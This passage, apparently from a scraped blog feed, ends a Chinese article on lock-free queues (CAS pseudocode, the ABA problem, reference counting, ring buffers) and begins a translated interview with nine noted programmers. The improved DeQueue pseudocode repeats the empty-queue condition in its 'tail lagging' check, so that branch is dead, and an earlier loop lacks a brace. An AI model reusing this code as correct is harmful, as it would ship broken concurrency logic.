        //如果尾指针的 next 不为NULL，则 fetch 全局尾指针到next
        if ( next != NULL ) {
            CAS(Q-&gt;tail, tail, next);
            continue;
        }

        //如果加入结点成功，则退出
        if ( CAS(tail-&gt;next, next, n) == TRUE ) break;
    }
    CAS(Q-&gt;tail, tail, n); //置尾结点
}
</pre>
<p>上述的代码还是很清楚的，相信你一定能看懂，而且，这也是 Java 中的 <code>ConcurrentLinkedQueue</code> 的实现逻辑，当然，我上面的这个版本比 Java 的好一点，因为没有 if 嵌套，嘿嘿。</p>
<p>好了，我们解决了EnQueue，我们再来看看DeQueue的代码：（很简单，我就不解释了）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">DeQueue(Q) //出队列
{
    do{
        p = Q-&gt;head;
        if (p-&gt;next == NULL){
            return ERR_EMPTY_QUEUE;
        }
    while( CAS(Q-&gt;head, p, p-&gt;next) != TRUE );
    return p-&gt;next-&gt;value;
}</pre>
<p><strong>我们可以看到，DeQueue的代码操作的是 <code>head-&gt;next</code>，而不是 <code>head</code> 本身。这样考虑是因为一个边界条件，我们需要一个dummy的头指针来解决链表中如果只有一个元素，<code>head</code> 和 <code>tail</code> 都指向同一个结点的问题，这样 <code>EnQueue</code> 和 <code>DeQueue</code> 要互相排斥了</strong>。</p>
<p>但是，如果 <code>head</code> 和 <code>tail</code> 都指向同一个结点，这意味着队列为空，应该返回 <code>ERR_EMPTY_QUEUE</code>，但是，在判断 <code>p-&gt;next == NULL</code> 时，另外一个EnQueue操作做了一半，此时的 p-&gt;next 不为 NULL了，但是 tail 指针还差最后一步，没有更新到新加的结点，这个时候就会出现，在 EnQueue 并没有完成的时候， DeQueue 已经把新增加的结点给取走了，此时，队列为空，但是，head 与 tail 并没有指向同一个结点。如下所示：</p>
<p><img alt="image placeholder" ></p>
<p>虽然，EnQueue的函数会把 tail 指针置对，但是，这种情况可能还是会导致一些并发问题，所以，严谨来说，我们需要避免这种情况。于是，我们需要加入更多的判断条件，还确保这个问题。下面是相关的改进代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">DeQueue(Q) //出队列，改进版
{
    while(TRUE) {
        //取出头指针，尾指针，和第一个元素的指针
        head = Q-&gt;head;
        tail = Q-&gt;tail;
        next = head-&gt;next;

        // Q-&gt;head 指针已移动，重新取 head指针
        if ( head != Q-&gt;head ) continue;
        
        // 如果是空队列
        if ( head == tail &amp;&amp; next == NULL ) {
            return ERR_EMPTY_QUEUE;
        }
        
        //如果 tail 指针落后了
        if ( head == tail &amp;&amp; next == NULL ) {
            CAS(Q-&gt;tail, tail, next);
            continue;
        }

        //移动 head 指针成功后，取出数据
        if ( CAS( Q-&gt;head, head, next) == TRUE){
            value = next-&gt;value;
            break;
        }
    }
    free(head); //释放老的dummy结点
    return value;
}</pre>
<p>上面这段代码的逻辑和 Java 的 <code>ConcurrentLinkedQueue</code> 的 <code>poll</code> 方法很一致了。也是《<a href="https://www.cs.rochester.edu/u/scott/papers/1996_PODC_queues.pdf" target="_blank" rel="noopener noreferrer">Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms</a>》这篇论文中的实现。</p>
<h4>
<span class="ez-toc-section" id="CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98"></span>CAS的ABA问题<span class="ez-toc-section-end"></span>
</h4>
<p>所谓ABA（<a href="https://en.wikipedia.org/wiki/ABA_problem" target="_blank" rel="noopener noreferrer">见维基百科的ABA词条</a>），问题基本是这个样子：</p>
<ol>
<li>进程P1在共享变量中读到值为A</li>
<li>P1被抢占了，进程P2执行</li>
<li>P2把共享变量里的值从A改成了B，再改回到A，此时被P1抢占。</li>
<li>P1回来看到共享变量里的值没有被改变，于是继续执行。</li>
</ol>
<p>虽然P1以为变量值没有改变，继续执行了，但是这个会引发一些潜在的问题。<strong>ABA问题最容易发生在lock free 的算法中的，CAS首当其冲，因为CAS判断的是指针的值。很明显，值是很容易又变成原样的。</strong></p>
<p>比如上述的DeQueue()函数，因为我们要让head和tail分开，所以我们引入了一个dummy指针给head，当我们做CAS的之前，如果head的那块内存被回收并被重用了，而重用的内存又被EnQueue()进来了，这会有很大的问题。（<strong>内存管理中重用内存基本上是一种很常见的行为</strong>）</p>
<p>这个例子你可能没有看懂，维基百科上给了一个活生生的例子——</p>
<blockquote><p>你拿着一个装满钱的手提箱在飞机场，此时过来了一个火辣性感的美女，然后她很暖昧地挑逗着你，并趁你不注意的时候，把用一个一模一样的手提箱和你那装满钱的箱子调了个包，然后就离开了，你看到你的手提箱还在那，于是就提着手提箱去赶飞机去了。</p></blockquote>
<p>这就是ABA的问题。</p>
<h4>
<span class="ez-toc-section" id="%E8%A7%A3%E5%86%B3ABA%E7%9A%84%E9%97%AE%E9%A2%98"></span>解决ABA的问题<span class="ez-toc-section-end"></span>
</h4>
<p>维基百科上给了一个解——使用double-CAS（双保险的CAS），例如，在32位系统上，我们要检查64位的内容</p>
<p style="padding-left: 30px;">1）一次用CAS检查双倍长度的值，前半部是值，后半部分是一个计数器。</p>
<p style="padding-left: 30px;">2）只有这两个都一样，才算通过检查，要吧赋新的值。并把计数器累加1。</p>
<p>这样一来，ABA发生时，虽然值一样，但是计数器就不一样（但是在32位的系统上，这个计数器会溢出回来又从1开始的，这还是会有ABA的问题）</p>
<p>当然，我们这个队列的问题就是不想让那个内存重用，这样明确的业务问题比较好解决，论文《<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.53.8674&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener noreferrer">Implementing Lock-Free Queues</a>》给出一这么一个方法——<strong>使用结点内存引用计数refcnt</strong>！（论文《<a href="https://www.cs.rochester.edu/u/scott/papers/1996_PODC_queues.pdf" target="_blank" rel="noopener noreferrer">Simple, Fast, and Practical Non-Blocking and Blocking ConcurrentQueue Algorithms</a>》中的实现方法也基本上是一样的，用到的是增加一个计数，可以理解为版本号）</p>
<p>）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="9,14">SafeRead(q)
{
    loop:
        p = q-&gt;next;
        if (p == NULL){
            return p;
        }

        Fetch&amp;Add(p-&gt;refcnt, 1);

        if (p == q-&gt;next){
            return p;
        }else{
            Release(p);
        }
    goto loop;
}</pre>
<p>其中的 Fetch&amp;Add和Release分是是加引用计数和减引用计数，都是原子操作，这样就可以阻止内存被回收了。</p>
<h4>
<span class="ez-toc-section" id="%E7%94%A8%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97"></span>用数组实现无锁队列<span class="ez-toc-section-end"></span>
</h4>
<p>本实现来自论文《<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.53.8674&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener noreferrer">Implementing Lock-Free Queues</a>》</p>
<p>使用数组来实现队列是很常见的方法，因为没有内存的分部和释放，一切都会变得简单，实现的思路如下：</p>
<p style="padding-left: 30px;">1）数组队列应该是一个ring buffer形式的数组（环形数组）</p>
<p style="padding-left: 30px;">2）数组的元素应该有三个可能的值：HEAD，TAIL，EMPTY（当然，还有实际的数据）</p>
<p style="padding-left: 30px;">3）数组一开始全部初始化成EMPTY，有两个相邻的元素要初始化成HEAD和TAIL，这代表空队列。</p>
<p style="padding-left: 30px;">4）EnQueue操作。假设数据x要入队列，定位TAIL的位置，使用double-CAS方法把(TAIL, EMPTY) 更新成 (x, TAIL)。需要注意，如果找不到(TAIL, EMPTY)，则说明队列满了。</p>
<p style="padding-left: 30px;">5）DeQueue操作。定位HEAD的位置，把(HEAD, x)更新成(EMPTY, HEAD)，并把x返回。同样需要注意，如果x是TAIL，则说明队列为空。</p>
<p>算法的一个关键是——如何定位HEAD或TAIL？</p>
<p style="padding-left: 30px;">1）我们可以声明两个计数器，一个用来计数EnQueue的次数，一个用来计数DeQueue的次数。</p>
<p style="padding-left: 30px;">2）这两个计算器使用使用Fetch&amp;ADD来进行原子累加，在EnQueue或DeQueue完成的时候累加就好了。</p>
<p style="padding-left: 30px;">3）累加后求个模什么的就可以知道TAIL和HEAD的位置了。</p>
<p>如下图所示：</p>
<p><img alt="image placeholder" ></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="_%E5%B0%8F%E7%BB%93"></span> 小结<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;">以上基本上就是所有的无锁队列的技术细节，这些技术都可以用在其它的无锁数据结构上。</p>
<p style="text-align: left; padding-left: 30px;">1）无锁队列主要是通过CAS、FAA这些原子操作，和Retry-Loop实现。</p>
<p style="text-align: left; padding-left: 30px;">2）对于Retry-Loop，我个人感觉其实和锁什么什么两样。只是这种“锁”的粒度变小了，主要是“锁”HEAD和TAIL这两个关键资源。而不是整个数据结构。</p>
<p style="text-align: left;">还有一些和Lock Free的文章你可以去看看：</p>
<ul>
<li>Code Project 上的雄文 《<a href="http://www.codeproject.com/Articles/153898/Yet-another-implementation-of-a-lock-free-circular" target="_blank" rel="noopener noreferrer">Yet another implementation of a lock-free circular array queue</a>》</li>
<li>Herb Sutter的《<a href="http://www.drdobbs.com/parallel/writing-lock-free-code-a-corrected-queue/210604448?pgno=1" target="_blank" rel="noopener noreferrer">Writing Lock-Free Code: A Corrected Queue</a>》– 用C++11的std::atomic模板。</li>
<li>IBM developerWorks的《<a href="https://www.ibm.com/developerworks/cn/aix/library/au-multithreaded_structures2/index.html" target="_blank" rel="noopener noreferrer">设计不使用互斥锁的并发数据结构</a>》</li>
</ul>
<div>【<strong>注：我配了一张look-free的自行车，寓意为——如果不用专门的车锁，那么自行得自己锁自己！</strong>】</div>
<p style="text-align: left;"> （全文完）</p>
<p><audio style="display: none;" controls="controls"></audio></p>
<p><audio style="display: none;" controls="controls"></audio></p>
<p><audio style="display: none;" controls="controls"></audio></p>
 ]]></content>
<pubDate>2012-09-07T08:26:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/8239.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 对九个超级程序员的采访 ]]></title>
<link>https://coolshell.cn/articles/8275.html</link>
<content><![CDATA[ 
<p>原文：《<a href="http://www.dodgycoder.net/2012/09/q-with-nine-great-programmers.html" target="_blank">Q&amp;A With Nine Great Programmers</a>》时间有限，我只能粗译，难免错误。</p>
<p><strong>这篇访谈源自2006年，最先发布在波兰程序员 Jaroslaw “sztywny” Rzeszótko (AKA “Stiff”) 的博客上。但是这篇博文现在找不到了。非常感谢他能授权我重新发布这个博文。</strong></p>
<p style="padding-left: 30px;"><em>在一个炎热无聊的下午，我突发奇想。我想通过电子邮件的方式对那些我非常感兴趣和非常敬重的程序员问10个问题。准备这10个问题我只花了5分钟，这些都是我个人想问他们的问题，所以，我基本上没想太多要问他们什么。最后两个问题和编程没有什么关系，我就是想问题这些人的一些兴趣爱好。另外，不是每一个人都想回答我的，这是我第一次做“访谈”，所以，我犯了一些错误，一些问题没有得到回答。不管怎么样，我得到了很多很有意思的内容，所以，这对我绝对是一次很有意义的经历。</em><br>
<em></em></p>
<p style="padding-left: 30px;"><em>并不是每一个人都回了我的邮件，也并不是每一个人都同意回答我的这些问题，也许在我发布这篇文章后我会得到那些回答，但是我已经迫不及待想把这些东西发布了，所以，我可能会更新这篇文章（更新：2006年3月8日，我收到了<em>Bjarne Stroustrup的回信</em>）</em></p>
<p><em>— Jaroslaw</em></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%8B%E7%BB%8D" title="介绍">介绍</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Q_1_%E4%BD%A0%E6%98%AF%E6%80%8E%E4%B9%88%E5%AD%A6%E7%BC%96%E7%A8%8B%E7%9A%84%EF%BC%9F%E6%98%AF%E4%BB%8E%E5%AD%A6%E6%A0%A1%E9%87%8C%E5%AD%A6%E7%9A%84%E5%90%97%EF%BC%9F%E6%88%96%E8%80%85%E4%BD%A0%E6%B2%A1%E6%9C%89%E4%B8%8A%E8%BF%87%E5%AD%A6_%EF%BC%9F" title="Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？">Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Q_2_%E4%BD%A0%E4%BB%AC%E8%A7%89%E5%BE%97%E5%AF%B9%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E4%BA%8B%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" title="Q 2: 你们觉得对程序员最重要的事是什么？">Q 2: 你们觉得对程序员最重要的事是什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Q_3_%E4%BD%A0%E6%98%AF%E5%90%A6%E8%AE%A4%E4%B8%BA%E6%95%B0%E5%AD%A6%E5%92%8C%E6%88%96%E7%89%A9%E7%90%86%E6%98%AF%E4%B8%80%E7%A7%8D%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%9F" title="Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？">Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Q_4_%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A8%8B%EF%BC%8C%E4%BD%A0%E4%BB%AC%E8%AE%A4%E4%B8%BA%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E5%A4%A7%E4%BA%8B%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FX-Oriented%E7%BC%96%E7%A8%8B%EF%BC%8CY%E8%AF%AD%E8%A8%80%EF%BC%8C%E9%87%8F%E5%AD%90%E7%94%B5%E8%84%91_%EF%BC%9F" title="Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？">Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Q_5_%E5%A6%82%E6%9E%9C%E4%BD%A0%E6%9C%893%E4%B8%AA%E6%9C%88%E5%AD%A6%E4%B8%80%E4%B8%AA%E7%9B%B8%E5%AF%B9%E8%BE%83%E6%96%B0%E7%9A%84%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%AD%A6%E4%BB%80%E4%B9%88%EF%BC%9F" title="Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？">Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Q_6_%E4%BD%A0%E4%BB%AC%E8%A7%89%E5%BE%97%E5%A6%82%E4%BD%95%E8%AE%A9%E4%B8%80%E4%BA%9B%E7%A8%8B%E5%BA%8F%E5%91%98%E5%8F%AF%E8%83%BD%E6%9C%89%E8%B6%85%E8%BF%87%E5%85%B6%E5%AE%83%E7%A8%8B%E5%BA%8F%E5%91%9810%E5%80%8D%E6%88%96100%E5%80%8D%E7%9A%84%E7%94%9F%E4%BA%A7%E5%8A%9B%EF%BC%9F" title="Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？">Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Q_7_%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E6%98%AF%E4%BD%A0%E7%9A%84%E6%9C%80%E7%88%B1%EF%BC%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BC%96%E7%A8%8B%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%EF%BC%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%8C%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%EF%BC%8Cshell%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E6%88%96%E5%85%B6%E5%AE%83%E6%B2%A1%E5%AE%83%E4%BD%A0%E6%B4%BB%E4%B8%8D%E4%BA%86%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%89%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E6%98%AF%E5%88%AB%E7%9A%84%EF%BC%9F" title="Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？">Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Q_8_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%BC%96%E7%A8%8B%E4%B9%A6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" title="Q 8: 你最喜欢的编程书是什么？">Q 8: 你最喜欢的编程书是什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Q_9_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E5%92%8C%E7%BC%96%E7%A8%8B%E6%97%A0%E5%85%B3%E7%9A%84%E4%B8%80%E6%9C%AC%E4%B9%A6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" title="Q 9: 你最喜欢的和编程无关的一本书是什么？">Q 9: 你最喜欢的和编程无关的一本书是什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Q_10_%E4%BD%A0%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B9%90%E9%98%9F%E6%BC%94%E5%A5%8F%E5%AE%B6%E4%BD%9C%E6%9B%B2%E5%AE%B6%EF%BC%9F" title="Q 10: 你最喜欢的乐队/演奏家/作曲家？">Q 10: 你最喜欢的乐队/演奏家/作曲家？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#_%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E" title=" 补充说明"> 补充说明</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%8B%E7%BB%8D"></span>介绍<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Linus_Torvalds"><strong>Linus Torvalds</strong></a> – <a href="http://linux.org/">Linux kernel</a> 作者。</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Dave_Thomas_(programmer)"><strong>Dave Thomas</strong></a> – “Pragmatic Programmer”(注：<a href="https://book.douban.com/subject/1417047/" target="_blank">douban</a>) 和 “Programming Ruby”(注：<a href="https://book.douban.com/subject/1422056/" target="_blank">douban</a>) 以及其它一些优秀书籍的作者。 你可以在 <a href="http://pragdave.pragprog.com/">这里</a> 读读他对编程的一些想法。</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/David_Heinemeier_Hansson"><strong>David Heinemeier Hansson</strong></a> –   <a href="http://rubyonrails.org/">Rails Framework</a> 作者- 一个目前最新最热的Web开发框架。他的blog在 <a href="http://david.heinemeierhansson.com/">这里</a>. （陈皓注：他也是<a title="37signals" href="https://en.wikipedia.org/wiki/37signals">37signals</a>的领导人之一）</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Steve_Yegge"><strong>Steve Yegge</strong></a> – 他可能并不那么知名，但是他给了很多有意思的回答。他有一个很火的关于编程的 <a href="https://steve-yegge.blogspot.com/">blog</a>，他也是游戏 “Wyvern” 的作者。（陈皓注：他最火的是去年在google+上<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">对google和amazon的吐槽</a>，06年他应该在google了）</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Peter_Norvig"><strong>Peter Norvig</strong></a> – Research Director at Google, 知名的 Lisper，AI书的著名作家，<a href="http://norvig.com/">个人主页</a>。</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Guido_Van_Rossum"><strong>Guido Van Rossum</strong></a> – <a href="https://python.org/">Python</a> 发明者。</li>
</ul>
<ul>
<li>
<a href="https://en.wikipedia.org/wiki/Bjarne_Stroustrup"><strong>Bjarne Stroustrup</strong></a> – C++发明者， <a href="http://www.stroustrup.com/">个人主页</a>。</li>
</ul>
<ul>
<li>
<strong><a href="https://en.wikipedia.org/wiki/James_Gosling">James Gosling</a></strong> –  <a href="http://java.sun.com/">Java</a> 发明者。</li>
</ul>
<ul>
<li>
<strong><a href="https://en.wikipedia.org/wiki/Tim_bray">Tim Bray</a></strong> –  XML 和 Atom 规格说明书作者之一 <a href="https://www.tbray.org/ongoing/">个人博客</a> 。</li>
</ul>
<div><span id="more-8275"></span></div>
<h4>
<span class="ez-toc-section" id="Q_1_%E4%BD%A0%E6%98%AF%E6%80%8E%E4%B9%88%E5%AD%A6%E7%BC%96%E7%A8%8B%E7%9A%84%EF%BC%9F%E6%98%AF%E4%BB%8E%E5%AD%A6%E6%A0%A1%E9%87%8C%E5%AD%A6%E7%9A%84%E5%90%97%EF%BC%9F%E6%88%96%E8%80%85%E4%BD%A0%E6%B2%A1%E6%9C%89%E4%B8%8A%E8%BF%87%E5%AD%A6_%EF%BC%9F"></span>Q 1: 你是怎么学编程的？是从学校里学的吗？或者你没有上过学:) ？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>在我17岁的时候，我在HP的计算器中用他们的RPN 栈语言自学编程的。在这之前，我尝试过学习编程一两次，但都没有学成。HP 28c 和 48g 的科学计算器是一个很牛的东西，而且还有不错的文档。我搞了一本3D图形的书，并很费力地把其中的Pascal语言转成RPN栈语言，并用48g写了一个3D的线框图渲染图。运行的还不错，在我买了PC和Turbo Pascal之后，我开始认真地学习编程。在我进入大学计算机科学专业之前，我已经是一个不错的程序员了。</p>
<p>我在华盛顿大学拿到了计算机科学学位，这绝对是有价值的，所以，我建议所有的程序员都应该得到计算机科学专业的学位。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我没有在学校里学过编程，我在主要是读我自己想读的书，或是就直接去编程 (一开始在 <a href="https://en.wikipedia.org/wiki/Commodore_VIC-20" target="_blank">Commodore VIC-20</a> 学编程， 然后是 <a href="https://en.wikipedia.org/wiki/Sinclair_QL" target="_blank">Sinclair QL</a>上编程)。</p>
<p>当然，我觉得上大学非常有用。我没有去一个工科大学，我上了赫尔辛基大学，这是一个比较偏理论的大学，所以，那里的教育并没有那么多的编程的东西（编程只是很少一部分），这里大多数的课程都倾向于教一些基础概念的东西，如：复杂性分析。看上去很无聊，甚至有点浪费时间，但是我还是觉得这些课有用，我对大多数课都还比较enjoy。所以，我觉得我可能在这些方面是一个比较好的程序员。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我学编程是从用HTML做我的第一个网页开始的。那时，我想当我的网页能动态地显示一些内容，所以，我选择了ASP和PHP。在做完这个网页后，我知道了怎么去编程，于是我开始我的计算机科学和商业管理学位的学习。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我是从高中和大学课程中学编程的，但是我还是觉得我自己学得更多。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>我是在高中学编程的。我完全地迷住了，我对编程爱得无法自拔，然后，我开始挑选那些提供软件开发课程的大学。最终，我去了伦敦大学的帝国学院。第二年我就开始学习软件开发的课程了，那绝对是非凡的，学生和教员在一起工作把教材做得更好，每一个人都可以从中学到很多。这些课程给了我难以置信和非常雄厚的软件开发背景。我在那里读到了博士，最后去创业了。</p>
<p>关于“我是怎么学编程的”这个问题，我的回答是“我现在还在学编程”。我认为好的程序员一生都在学编程。这并不是去学一门语言或是一个代码库，好的程序员会对他们的编程技艺一年又一年地精益求精。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>我去的那个大学有一个大型主机和很多不同的计算机课程。这对我很重要。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>起初，我是自学的。在我去上大学之前，我就找到了一份程序员的工作。但是我很高兴我去了大学，在那里有很多乐趣，最终我学到了博士。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我先上的是Aarhus大学， 然后是 剑桥大学(Cambridge)，这两个大学教了我很多很有用的东西，这些东西为了以后的工作打下了基础。另外，我对编程和钱的关系学得非常好——知道了真实世界的问题，正确性，维护性，准时交付，等等，这些比教育可能更重要。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>我本来想去做一个数学老师的。但是，那个学数学的大学要我去学几个计算机的课。</p>
<h4>
<span class="ez-toc-section" id="Q_2_%E4%BD%A0%E4%BB%AC%E8%A7%89%E5%BE%97%E5%AF%B9%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E4%BA%8B%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"></span>Q 2: 你们觉得对程序员最重要的事是什么？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>沟通能力（写和说）。除非你可以让你的想法更有效率地传递出去，否则你不可能做得比编程更多的事。程序员应该疯狂地阅读，锻炼写作能力，参加一些写作培训课程，甚至锻炼在公开场合演讲的能力。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>It’s a thing I call “taste”. 有一件事，我把它叫做“品味”。</p>
<p>我倾向于不从熟练程度来评判那些和我工作过的人。这些人能非常艰苦地写出很多代码，但是我想从他们对别人的代码的反应做出评判，这样我们就可以明白他们自己写的代码怎么样，知道他们使用的方法怎么样。他们对别人的评判还告诉我，他们是不是有好的“品味”。是这样的，如果一个人没有“好的品味”，那么他一般不会很好的评判他人的代码，他自己写的代码通常也不会很好。</p>
<p>哦，这并不只是唯一的事。还有一件事，尤其在开源项目里，那是他是否有能力能和别人进行简单的沟通，告诉别人他要干什么，怎么干。这个能力可以告诉别人为什么你干的事是非常重要的，并不是所有的人都有这个能力。</p>
<p>也就是说，有一些人可以写出很不错的代码，但他们并不一定能解释这些代码，他们也并不一定有好的品味，但是代码可以运行得不错。有时，你需要另一个人（有那种不错的品味的人）把他的代码转成更好的形式。也就是说，任何一个程序员都需要那种可以用清晰的代码来解决复杂问题的基础能力。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>很强的对有价值的事的感觉。你可以问问自己这个问题你有没有这种能力：我现在做的这个事值不值得做？很多程序员浪费了如大海一样的时间去做一些无意义的事。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我不觉得只有一个，如果要我说一个的话，我说是“专注”。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>热情。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>你的问题很难回答啊:-) 我猜，如果程序员会在早晨煎个鸡蛋做早餐，那真是无价的能力。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>自我激发。你需要全身心地投入到你要做的事中。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>把事想清楚的能力：程序必需要能清楚地理解问题并能清楚地表述解决方案。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>能为自己的直觉提供证据的能力。</p>
<h4>
<span class="ez-toc-section" id="Q_3_%E4%BD%A0%E6%98%AF%E5%90%A6%E8%AE%A4%E4%B8%BA%E6%95%B0%E5%AD%A6%E5%92%8C%E6%88%96%E7%89%A9%E7%90%86%E6%98%AF%E4%B8%80%E7%A7%8D%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%9F"></span>Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？<span class="ez-toc-section-end"></span>
</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>数学有很多的分支和程序员相关，他们是“离散数学”和“具体数学”。这些分支包括的学科有，概率论，组合数学，图论，归纳证明，和其它有用的东西。我会鼓励所有的程序员都去学习离散数学，无论能学多少，因为这总比什么都不懂强。</p>
<p>对于传统的数学，我也不经常用，但是我需要的时候这些数学知识会很管用。例如，在我之前的工作中我就用到了微积分。我需要估计每个小时中某服务的高峰时间的流量负载，所以，他的负载是跟着太阳走的就像一个正弦曲线一样。最简单的方式就是把每个小时的负载曲线给整合起来。如果我不知道微积分，我就不知道怎么更为准确地估计。</p>
<p>当年我在开发我的Wyvern游戏的时候，我的平面几何的知识对我非常有帮助。而且经常使用代数和线性代数的知识。但我很少在工作中使用三角学或微分方程，微积分同样也很少。</p>
